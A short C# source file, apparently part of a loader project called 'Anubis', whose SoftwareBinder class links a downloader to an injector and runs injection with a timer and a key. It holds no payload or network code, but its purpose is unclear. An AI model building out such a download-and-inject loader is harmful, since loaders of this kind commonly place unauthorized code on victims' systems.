using System;
using System.Diagnostics;
using System.Management;

namespace Anubis.Loader.Core.Software
{
    public class SoftwareBinder
    {
        private SoftwareDownloader m_Downloader;
        private SoftwareInjector m_Injector;

        public SoftwareBinder()
        { }

        public void ApplyTemplate<T>(T self)
        {
            if (typeof(T) == typeof(SoftwareDownloader))
            {
                m_Downloader = (SoftwareDownloader)(object)self;
            }
            else
            {
                Console.WriteLine("Can't execute retrieved template");
            }
        }

        public bool Prepare()
        {
            if (m_Downloader == null)
                return false;

            m_Injector = new SoftwareInjector(m_Downloader);
            return m_Injector != null;
        }

        public bool Execute(int seconds, string key)
        {
            if (m_Injector == null)
                return false;

            return m_Injector.Execute(seconds, key);
        }
    }
}
